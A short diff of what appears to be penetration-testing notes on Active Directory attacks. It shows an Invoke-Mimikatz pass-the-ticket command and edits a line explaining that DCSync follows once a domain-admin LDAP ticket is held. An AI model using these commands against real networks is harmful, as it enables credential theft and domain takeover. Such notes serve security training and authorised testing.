@@ -343,7 +343,7 @@ then inject the ticket with mimikatz:
 ```
 Invoke-Mimikatz -Command '"kerberos::ptt <Ticket.kirbi>"'
 ```
--> then we can dcsync with mimikatz
+-> then we can dcsync with mimikatz because we got ldap tgs as domain admin
 
 --------------------------------------------------------------
 
